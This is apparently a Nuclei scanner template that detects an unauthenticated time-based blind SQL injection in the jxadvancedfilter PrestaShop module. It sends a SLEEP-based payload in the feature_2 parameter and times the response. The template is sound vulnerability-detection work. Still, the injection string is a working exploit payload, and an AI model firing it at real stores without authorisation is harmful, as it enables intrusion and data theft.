id: jxadvancedfilter-sqli

info:
  name: PrestaShop jxadvancedfilter - Time-Based Blind SQL Injection
  author: acunetix-export
  severity: critical
  description: |
    Module jxadvancedfilter for PrestaShop contains time-based blind SQL injection
    in jxadvancedfilter-ajax.php via GET parameter feature_2. No authentication required.
  reference:
    - https://security.friendsofpresta.org/
  classification:
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    framework: prestashop
    module: jxadvancedfilter
  tags: sqli,prestashop,jxadvancedfilter,time-based,blind

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/modules/jxadvancedfilter/jxadvancedfilter-ajax.php"
    matchers:
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403 && duration <= 3'
        internal: true

  - raw:
      - |
        @timeout: 20s
        GET /modules/jxadvancedfilter/jxadvancedfilter-ajax.php?feature_2=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403'
